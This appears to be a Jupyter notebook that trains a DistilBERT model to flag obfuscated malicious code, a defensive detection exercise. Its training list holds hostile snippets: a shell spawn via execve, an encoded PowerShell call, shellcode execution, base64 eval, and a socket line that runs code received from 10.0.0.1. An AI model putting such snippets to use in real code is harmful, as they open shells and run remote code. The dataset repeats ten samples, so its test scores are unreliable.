{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "4ba37346",
   "metadata": {},
   "source": [
    "pip install transformers datasets scikit-learn"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "88773234",
   "metadata": {
    "vscode": {
     "languageId": "plaintext"
    }
   },
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "from sklearn.model_selection import train_test_split\n",
    "from sklearn.metrics import classification_report\n",
    "from transformers import DistilBertTokenizer, TFDistilBertForSequenceClassification\n",
    "import tensorflow as tf\n",
    "\n",
    " \n",
    "# 1. Simulate Obfuscated vs. Clean Code\n",
    " \n",
    "def load_dataset():\n",
    "    malicious = [\n",
    "        \"char*x=strcat(strcpy(malloc(8),\\\"/bin\\\"),\\\"/sh\\\");execve(x,0,0);\",\n",
    "        \"int a=system(\\\"powershell -enc JABX... \\\");\",\n",
    "        \"unsigned char code[]={0x90,0x90,0x90,...};((void(*)())code)();\",\n",
    "        \"eval(base64.b64decode(b'cHJpbnQoIkhlbGxvIik='))\",\n",
    "        \"import socket; socket.connect(('10.0.0.1', 6666)); exec(sock.recv(2048))\"\n",
    "    ]\n",
    "\n",
    "    benign = [\n",
    "        \"def greet(): print(\\\"Hello World\\\")\",\n",
    "        \"int main() { printf(\\\"Welcome\\\"); return 0; }\",\n",
    "        \"document.getElementById(\\\"btn\\\").addEventListener(\\\"click\\\", greet);\",\n",
    "        \"System.out.println(\\\"Login successful\\\");\",\n",
    "        \"#include<stdio.h>\\nvoid sum() { int a=2,b=3; printf(\\\"%d\\\",a+b); }\"\n",
    "    ]\n",
    "\n",
    "    texts = malicious * 100 + benign * 100\n",
    "    labels = [1]*len(malicious)*100 + [0]*len(benign)*100\n",
    "\n",
    "    return pd.DataFrame({'code': texts, 'label': labels})\n",
    "\n",
    " \n",
    "# 2. Preprocess with Tokenizer\n",
    " \n",
    "def prepare_data(df):\n",
    "    tokenizer = DistilBertTokenizer.from_pretrained('distilbert-base-uncased')\n",
    "    encodings = tokenizer(df['code'].tolist(), truncation=True, padding=True, max_length=128)\n",
    "    return encodings, tf.convert_to_tensor(df['label'].values), tokenizer\n",
    "\n",
    " \n",
    "# 3. Train Transformer Model\n",
    " \n",
    "def train_model(encodings, labels):\n",
    "    model = TFDistilBertForSequenceClassification.from_pretrained(\n",
    "        'distilbert-base-uncased', num_labels=2)\n",
    "\n",
    "    dataset = tf.data.Dataset.from_tensor_slices((dict(encodings), labels))\n",
    "    dataset = dataset.shuffle(200).batch(16)\n",
    "\n",
    "    model.compile(optimizer=tf.keras.optimizers.Adam(learning_rate=5e-5),\n",
    "                  loss=tf.keras.losses.SparseCategoricalCrossentropy(from_logits=True),\n",
    "                  metrics=['accuracy'])\n",
    "\n",
    "    model.fit(dataset, epochs=3)\n",
    "    return model\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1ee1fdf1",
   "metadata": {
    "vscode": {
     "languageId": "plaintext"
    }
   },
   "outputs": [],
   "source": [
    "def evaluate_model(model, tokenizer, df):\n",
    "    encodings = tokenizer(df['code'].tolist(), truncation=True, padding=True, max_length=128)\n",
    "    dataset = tf.data.Dataset.from_tensor_slices(dict(encodings)).batch(16)\n",
    "    predictions = tf.argmax(model.predict(dataset).logits, axis=1).numpy()\n",
    "    print(\"\\nClassification Report:\\n\", classification_report(df['label'], predictions))\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f40babe4",
   "metadata": {
    "vscode": {
     "languageId": "plaintext"
    }
   },
   "outputs": [],
   "source": [
    "if __name__ == \"__main__\":\n",
    "    df = load_dataset()\n",
    "    train_df, test_df = train_test_split(df, test_size=0.2, random_state=42)\n",
    "    \n",
    "    encodings, labels, tokenizer = prepare_data(train_df)\n",
    "    model = train_model(encodings, labels)\n",
    "\n",
    "    evaluate_model(model, tokenizer, test_df)"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
